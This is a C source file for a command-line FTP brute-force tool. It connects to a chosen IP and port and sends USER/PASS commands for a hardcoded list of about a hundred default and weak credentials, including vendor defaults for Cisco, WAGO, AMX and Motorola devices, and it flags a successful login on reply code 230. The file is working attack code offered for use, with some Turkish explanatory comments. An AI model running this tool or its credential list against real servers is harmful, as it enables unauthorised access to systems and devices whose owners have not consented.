#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <time.h>


#define BUFFER_SIZE 1024


void scanBeginV4(const char* targetIp, int port, char* protocol) {
	
    printf("\nAttack => Brute Force..\n");
    printf("--------------------------------------------------------\n\n");
    printf("Github: https://github.com/hunkaracar\n");
    printf("Brute force attack against [%d] [%s] ports\n",port,protocol);
    printf("Initializing Brute FOrce Attack\n");

    // Get current time
    time_t now;
    time(&now);

    // Convert to struct tm
    struct tm* localTime = localtime(&now);

    // Time info
    int hour = localTime->tm_hour;
    int minute = localTime->tm_min;
    int second = localTime->tm_sec;

    // Date info
    int day = localTime->tm_mday;
    int month = localTime->tm_mon + 1;
    int year = localTime->tm_year + 1900;

    // Print time and date
    printf("at hours: %02d:%02d:%02d\n", hour, minute, second);
    printf("at day: %02d/%02d/%d\n", day, month, year);

    printf("Target IP [%s] Attempt\n\n", targetIp);
    printf("--------------------------------------------------------------\n\n");
    printf("Initializing Brute FOrce Attack...\n");
    sleep(5);
}



//Helper function that reads the response from the server

char* Read_Response(int sockfd) {
	
	char buffer[BUFFER_SIZE];
	memset(buffer,0,sizeof(buffer));
	if (read(sockfd, buffer, sizeof(buffer) - 1) < 0) {
		perror("Could not read response from server");
		exit(1);
	}
	//printf("----------------------------------------------------------------------\n");
	printf("\nResponse from Server: %s\n:", buffer);
	
	return strdup(buffer);

}
/*
int checkHostStatusssss(const char* targetIp) {
    char command[100];
	sprintf(command, "ping -c 1 -W 1 %s > /dev/null 2>&1", targetIp);
	int status = system(command);

    if (WIFEXITED(status) && WEXITSTATUS(status) == 0) {
        return 1; // Host is up
    } else {
        return 0; // Host is down
    }
}
 */

void bruteForceMode(const char* target_ip, int port, const char* protocol){
	/*
	if (!checkHostStatusssss(target_ip)) {
        printf("\nDiscovery Host is down: %s\n", target_ip);
        return;
    }
    */
	
	//Username and Password List
	char* username_passwords[][2] = {
		
		{"admin","admin"},
		{"root","root"},
		{"root","root123"},
		{"root","password"},
		{"anonymous","anonymous"},
		{"admin","password"},
		{"admin","12345"},
		{"admin","123456"},
		{"admin","1234567"},
		{"admin","12345678"},
		{"admin","123456789"},
		{"admin","qwerty"},
		{"admin","letmein"},
		{"admin","test"},
		{"admin","1234"},
		{"admin","1111"},
		{"admin","password1"},
		{"admin","pass123"},
		{"admin","123abc"},
		{"admin","welcome"},
		{"admin","abc123"},
		{"admin","login"},
		{"admin","1234567890"},
		{"admin","default"},
		{"admin","0000"},
		{"admin","system"},
		{"admin","123"},
		{"admin","1234abcd"},
		{"admin","1q2w3e4r"},
		{"admin","123qwe"},
		{"admin","123qweasd"},
		{"admin","123qwea"},
		{"admin","123qweasd"},
		{"admin","1qaz2wsx"},
		{"admin","!@#$%^"},
		{"admin","summer2023"},
		{"root", "root"},
		{"root", "password"},
		{"root", "12345"},
		{"root", "123456"},
		{"root", "1234567"},
		{"root", "12345678"},
		{"root", "123456789"},
		{"root", "qwerty"},
		{"root", "letmein"},
		{"root", "test"},
		{"root", "1234"},
		{"root", "1111"},
		{"root", "password1"},
		{"root", "pass123"},
		{"root", "123abc"},
		{"root", "welcome"},
		{"root", "abc123"},
		{"root", "login"},
		{"root", "1234567890"},
		{"root", "default"},
		{"root", "0000"},
		{"root", "system"},
		{"root", "123"},
		{"root", "1234abcd"},
		{"root", "1q2w3e4r"},
		{"root", "123qwe"},
		{"root", "123qweasd"},
		{"root", "1qaz2wsx"},
		{"root", "!@#$%^"},
		{"root", "summer2023"},
		{"root", "system"},
		{"administrator", "password"},
		{"NetLinx", "password"},
		{"administrator", "Amx1234!"},
		{"amx", "password"},
		{"amx", "Amx1234!"},
		{"admin", "1988"},
		{"admin", "admin"},
		{"Administrator", "Vision2"},
		{"cisco", "cisco"},
		{"root", "fidel123"},
		{"user", "user"},
		{"root", "default"},
		{"localadmin", "localadmin"},
		{"Root", "wago"},
		{"Admin", "wago"},
		{"User", "user"},
		{"Guest", "guest"},
		{"root", "rootpasswd"},
		{"admin", "password"},
		{"adtec", "none"},
		{"root", "timeserver"},
		{"root", "password"},
		{"Admin", "Su"},
		{"root", "admin"},
		{"admin", "motorola"},
		{"Admin", "5001"},
		{"User", "1001"},
		{"GE", "GE"},
		{"Admin", "Pass"},
	};
	
	int num_username_passwords = sizeof(username_passwords) / sizeof(username_passwords[0]);

    // Create Socket
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd < 0) {
        perror("Could not create socket!\n");
        exit(1);
    }

    // FTP server address information
    /*
     struct sockaddr_in server_addr; ifadesiyle, struct sockaddr_in türünde bir değişken olan server_addr tanımlanır. Bu yapı, IPv4 adresleriyle çalışmak için kullanılır.

    memset(&server_addr, 0, sizeof(server_addr)); ifadesiyle, server_addr yapısının bellekteki tüm alanları sıfırlanır. Bu, yapıyı temizlemek ve önceden var olan değerlerin olası etkilerini önlemek için yapılır.

    server_addr.sin_family = AF_INET; ifadesiyle, server_addr yapısının sin_family üyesine AF_INET atanır. AF_INET, IPv4 adreslerini temsil etmek için kullanılan adres ailesini belirtir.

    server_addr.sin_addr.s_addr = inet_addr(target_ip); ifadesiyle, server_addr yapısının sin_addr.s_addr üyesine, target_ip olarak belirtilen IPv4 adresinin inet_addr fonksiyonu tarafından dönüştürülmüş değeri atanır. inet_addr fonksiyonu, noktalı ondalık gösterimle ifade edilen bir IPv4 adresini, struct in_addr türündeki bir değere dönüştürür.

    server_addr.sin_port = htons(port); ifadesiyle, server_addr yapısının sin_port üyesine, port olarak belirtilen bağlantı noktasının ağ byte sırasına (network byte order) dönüştürülmüş değeri atanır. htons fonksiyonu, bağlantı noktasını doğru ağ byte sırasına dönüştürmek için kullanılır.
      */
      
    struct sockaddr_in server_addr;
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(target_ip);
    server_addr.sin_port = htons(port);

    // Connect to Server
    if (connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Could not connect to server\n");
        exit(1);
    }

    // Read server response
    char* server_response = Read_Response(sockfd);

    char username[30];
    char password[30];
    char buffer[BUFFER_SIZE];

    // Try username and password combinations
    for (int i = 0; i < num_username_passwords; i++) {
        strcpy(username, username_passwords[i][0]);
        strcpy(password, username_passwords[i][1]);

        // Send username to server
        char user_command[BUFFER_SIZE];
        sprintf(user_command, "USER %s\r\n", username);
        if (write(sockfd, user_command, strlen(user_command)) < 0) {
            perror("Username could not be sent");
            exit(1);
        }

        char* response = Read_Response(sockfd);

        // Send password to server
        char pass_command[BUFFER_SIZE];
        sprintf(pass_command, "PASS %s\r\n", password);
        if (write(sockfd, pass_command, strlen(pass_command)) < 0) {
            perror("Could not send password");
            exit(1);
        }
		
		/*
		 sprintf bir karakter dizisine biçimlendirilmiş verileri yerleştirirken, strstr bir karakter dizisinde alt dize araması yapar. 
		 */
        response = Read_Response(sockfd);

        // Check if login is successful
        if (strstr(response, "230") != NULL) {
            printf("\n>>>>>\nSuccessful login! Username: [%s], Password: [%s]<<<<<<<\n\n", username, password);
            break;
        }
        else {
            printf("Failed login! Username: [%s], Password: [%s]\n", username, password);
        }
    }

    // Close connection
    close(sockfd);
}
